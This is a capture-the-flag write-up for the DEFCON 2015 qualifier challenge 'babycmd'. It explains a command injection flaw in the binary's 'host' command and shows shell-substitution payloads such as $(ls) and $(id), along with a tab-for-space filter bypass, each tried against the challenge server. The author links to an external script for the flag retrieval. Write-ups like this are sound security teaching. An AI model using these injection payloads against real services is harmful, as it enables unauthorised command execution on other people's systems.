# babycmd
## Problem
babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me:15491 
[Download](http://downloads.notmalware.ru/babycmd_3ad28b10e8ab283d7df81795075f600b)

## Analysis
babycmd binary's "host" command is executed like this:
`popen('host "%s(user's argument)"',"r")`
This is vulnerable for command injection because argument's double quotes are not filtered.
When you send command like `host test".com`, binary will execute:
`popen('host "test".com',"r")`

    Welcome to another Baby's First Challenge!
    Commands: ping, dig, host, exit
    : host test".com
    sh: 1: Syntax error: Unterminated quoted string
    Commands: ping, dig, host, exit

Now you can inject commands you like.

    $ nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491

    Welcome to another Baby's First Challenge!
    Commands: ping, dig, host, exit
    : host test"$(ls)".com
    host: couldn't get address for 'boot': not found
    Commands: ping, dig, host, exit
    : host test"$(id)".com
    host: couldn't get address for 'gid=1001(babycmd)': not found
    Commands: ping, dig, host, exit
    : host test"$(pwd)".com
    Host test/.com not found: 3(NXDOMAIN)
    Commands: ping, dig, host, exit
    : ^C

Space was filtered, but "\t" is not filtered. You can use "\t" as separator.

    $ nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491

    Welcome to another Baby's First Challenge!
    Commands: ping, dig, host, exit
    : host test"$(ls	/home/babycmd)".com
    Using domain server:
    Name: flag.com
    Address: 69.93.11.174#53
    Aliases: 
    
    Host testbabycmd.ap-southeast-1.compute.internal not found: 5(REFUSED)
    Commands: ping, dig, host, exit

This means there is a file named "flag" in /home/babycmd.

# Exploit
My approach to retrieve the flag is open the "flag " file and send the charactor one by one using "cut" command.
It's not a nice way, but anyway, it worked.

https://github.com/Bono-iPad/CTF2015/blob/master/DEFCON2015Qual/babys-first/babycmd/babycmd.py
